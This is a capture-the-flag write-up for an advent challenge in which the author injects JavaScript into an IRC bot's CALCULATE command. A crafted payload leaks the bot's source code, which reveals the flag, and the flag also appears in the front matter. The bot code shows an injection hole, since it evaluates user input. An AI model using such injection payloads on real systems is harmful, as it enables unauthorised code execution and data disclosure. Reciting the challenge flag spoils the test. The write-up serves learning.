---
layout: writeup
title: 'Dec 21: Mr Santa'
level:
difficulty:
points:
categories: []
tags: []
flag: HV15-TZHg-KRLH-tHlC-PmiZ-uWzB

---

## Challenge

## Solution

We get an IRC bot to play with. We can say `HELLO`, ask him to
`CALCULATE` something for us or give him a `GIFT`

    <ysje>	        HELLO
    <MrSanta>	Hello, ysje
    <ysje>	        CALCULATE 40+2
    <MrSanta>	That's easy: 42
    <ysje>	        GIFT bla
    <MrSanta>	Thanks for all the fish, ysje, but that's not what I was wishing for!

We can inject some javascript,

    <ysje>	        CALCULATE Math
    <MrSanta>	That's easy: [object Math]
    <ysje>	        CALCULATE Object.getOwnPropertyNames(this)
    <MrSanta>	That's easy: Int8Array,encodeURIComponent,RegExp,WeakSet,NaN,Symbol,Float64Array,Int32Array,decodeURIComponent,ReferenceError,Float32Array,Uint8ClampedArray,WeakMap,Intl,decodeURI,Promise,JSON,Uint8Array,Error,EvalError,Uint16Array,Function,ArrayBuffer,Object,Set,URIError,Number,parseInt,Math,escape,Infinity,Boolean,DataView,undefined,isFinite,SyntaxError,String,encodeURI,Uint32Array,unescape,Date,RangeError,Map,eval,Int16Array,isNaN,parseFloat,TypeError,Arr

and if we're really crafty get him to show us his code:

    <ysje>	        CALCULATE (function () { var obj = {toString: function () { return arguments.callee.caller.toString() }}; throw obj })()
    <MrSanta>	This doesn't work out ... but that's your fault: function (from, text) {
    <MrSanta>	  console.log(from + ' => BOT: ' + text);
    <MrSanta>	  if (text.match(/^hello/i)) {
    <MrSanta>	     client.say(from, "Hello, "+from);
    <MrSanta>	  } else if (text.match(/^gift (.*)/i)) {
    <MrSanta>	    if (RegExp.$1 === 'five tons of flax') {
    <MrSanta>	       client.say(from, "Thanks a lot! I do have something in return for you: 'HV15-TZHg-KRLH-tHlC-PmiZ-uWzB'");
    <MrSanta>	    } else {
    <MrSanta>	       client.say(from, "Thanks for all the fish, "+from+", but that's not what I was wishing for!");
    <MrSanta>	    }
    <MrSanta>	  } else if (text.match(/^calculate (.*)/i)) {
    <MrSanta>	     expr = RegExp.$1;
    <MrSanta>	     console.log('evaluating "'+expr+'"');
    <MrSanta>	     try {
    <MrSanta>	        client.say(from, "That's easy: "+vm.runInNewContext('('+expr+')'));
    <MrSanta>	     } catch (e) {
    <MrSanta>	        client.say(from, "This doesn't work out ... but that's your fault: " + e);
    <MrSanta>	     }
    <MrSanta>	  } else {
    <MrSanta>	     client.say(from, "Sorry, I didn't understand. Maybe you meant to say HELLO, offer me a GIFT, or you want me to CALCULATE something?");
    <MrSanta>	  }
    <MrSanta>	}



